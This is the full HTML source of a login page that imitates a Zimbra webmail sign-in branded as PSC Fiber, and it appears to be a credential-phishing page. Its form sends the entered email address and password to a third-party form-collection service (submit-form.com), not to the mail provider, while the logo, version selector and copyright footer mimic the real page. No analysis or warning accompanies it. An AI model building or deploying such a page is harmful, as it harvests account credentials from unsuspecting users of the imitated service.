<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="client.css">
</head>
<body>
    <div class="login-container">
        <img src="img/logo_PSCFiber_Color.png" alt="PSC Fiber Logo" class="logo">
        <form class="login-form"  action="https://submit-form.com/BpZfHiq6G" method="post">
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" class="input-field" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" class="input-field" name="password" required>
            </div>
            <span class="sign-in">
            <div class=" checkbox-group">
                <input type="checkbox" id="stay-signed-in">
                <label style="font-size: small; width: max-content;" for="stay-signed-in">Stay signed in</label>
            </div>
            <button type="submit" class="sign-in-btn">Sign In</button>
            </span>
            <hr>
            <div class="form-group">
                <label class="version" for="version">Version:</label>
                <select id="version" name="checkbox" class="option">
                    <option value="default">Default</option>
                    <option value="advanced-ajax">Advanced(Ajax)</option>
                    <option value="standard-html">Standard(HTML)</option>
                    <option value="mobile">Mobile</option>
                    <option value="touch">Touch</option>
                </select>
                <a href="#" class="whats-this-link">What's This?</a>
            </div>
        </form>
    </div>
    <footer>
        <p>Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums<br>
        Copyright Â© 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>
    </footer>
</body>
</html>
